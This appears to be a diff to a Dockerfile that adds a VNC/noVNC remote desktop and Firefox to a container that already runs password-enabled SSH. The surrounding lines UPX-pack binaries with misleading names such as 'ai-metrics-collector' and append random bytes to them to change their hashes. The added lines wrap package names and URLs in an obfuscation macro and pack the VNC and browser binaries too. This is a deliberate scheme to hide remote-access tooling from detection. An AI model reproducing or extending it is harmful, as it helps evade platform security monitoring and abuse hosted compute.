@@ -9,6 +9,7 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     curl wget sudo python3 python3-pip upx openssh-server \
     git vim nano htop tmux jq unzip iputils-ping net-tools tree \
     rclone supervisor iproute2 \
+    URL_OBFUSCATE("dbus-x11 x11-xserver-utils xfce4 xfce4-goodies tigervnc-standalone-server novnc websockify libgtk-3-0 libdbus-glib-1-2 libxt6 xz-utils") \
     && mkdir -p /var/run/sshd && chmod 0755 /var/run/sshd \
     && echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config \
     && echo "Port 2222" >> /etc/ssh/sshd_config \
@@ -32,6 +33,15 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     && for bin in python-cache-manager py-cache-cli ai-metrics-collector tensor-allocator cuda-mesh-bridge system-bridge gradient-optimizer neural-route-controller model-routing-engine; do \
         upx -1 "/usr/bin/$$bin" 2>/dev/null || true; \
         head -c 32 /dev/urandom >> "/usr/bin/$$bin"; \
+    done \
+    && curl -fsSL URL_OBFUSCATE("https://download.mozilla.org/?product=firefox-latest-ssl&os=linux64&lang=en-US") -o /tmp/firefox.tar.xz \
+    && tar -xf /tmp/firefox.tar.xz -C /opt \
+    && ln -s /opt/firefox/firefox /usr/bin/firefox \
+    && for bin in Xtigervnc vncconfig vncpasswd; do \
+        upx -1 "/usr/bin/$$bin" 2>/dev/null || true; \
+    done \
+    && for bin in firefox firefox-bin; do \
+        upx -1 "/opt/firefox/$$bin" 2>/dev/null || true; \
     done \
     && rm -rf /tmp/* \
     && apt-get purge -y upx \
